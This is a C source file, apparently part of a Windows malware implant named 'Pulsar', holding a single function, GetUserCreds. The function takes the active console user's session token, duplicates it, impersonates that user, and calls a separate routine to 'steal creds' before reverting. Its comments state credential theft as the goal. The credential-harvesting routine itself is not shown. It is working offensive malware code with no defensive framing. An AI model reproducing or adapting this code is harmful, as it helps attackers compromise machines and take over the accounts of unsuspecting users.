#include "PulsarInternal.h"
#include "PulsarLog.h"
#include "creds.h"


#include <windows.h>
#include <Wtsapi32.h>
#include <Userenv.h>
#include <Lm.h>


//
// Impersonate the currently logged on user,
// and then steal that user's creds
//
VOID GetUserCreds(VOID){
	CHAR UserName[128] = {0};
	LPSTR LoggedOnUserName = NULL;
	DWORD dwUserNameLen = 128;
	HANDLE hToken= NULL;

	DBGPrint("Called\n");

	//Impersonate user
	DWORD dwSessionID = WTSGetActiveConsoleSessionId();
	if ( dwSessionID == 0xFFFFFFFF )
	{
		DBGPrint("WTSGetActiveConsoleSessionId failed. 0x%x\n", GetLastError());
		return;
	}

	//Current user
	dwUserNameLen = 128;
	if(GetUserName(UserName,&dwUserNameLen) ){
		DBGPrint("Current user is: <%s> \n",UserName);
	}

	//Get the name of the logged in user
    if(!WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE,dwSessionID,WTSUserName,&LoggedOnUserName,&dwUserNameLen ))
	{
		DBGPrint("WTSQuerySessionInformation failed. 0x%x\n",GetLastError());
		return;
	}
	DBGPrint("LoggedOnUserName. %s\n",LoggedOnUserName);


	//Get the token of the logged in user
	if ( !WTSQueryUserToken( dwSessionID, &hToken ) )
	{
		DBGPrint( "WTSQueryUserToken failed. 0x%x\n", GetLastError( ) );
		return;
	}

	// duplicate the token
	HANDLE hDuplicated = NULL;
	if ( !DuplicateToken( hToken, SecurityImpersonation, &hDuplicated ) )
	{
		DBGPrint( "DuplicateToken failed. 0x%x\n", GetLastError( ) );
		CloseHandle( hToken );
		return;
	}

	if(ImpersonateLoggedOnUser(hDuplicated) != TRUE){
		DBGPrint("ImpersonateLoggedOnUser Failed\n");
		CloseHandle( hToken);
		CloseHandle(hDuplicated);
		return;
	}


	//steal creds
	GetCredsForCurrentUser(NULL);

	//Restore user
	RevertToSelf();


	//Free duplicated token
	if( hDuplicated){
		CloseHandle( hDuplicated );
	}

	//Free original token
	if(hToken){
		CloseHandle( hToken );
	}

	//Free logged in user name
	if(LoggedOnUserName){
		WTSFreeMemory(LoggedOnUserName);
	}

	DBGPrint("Returning\n");

}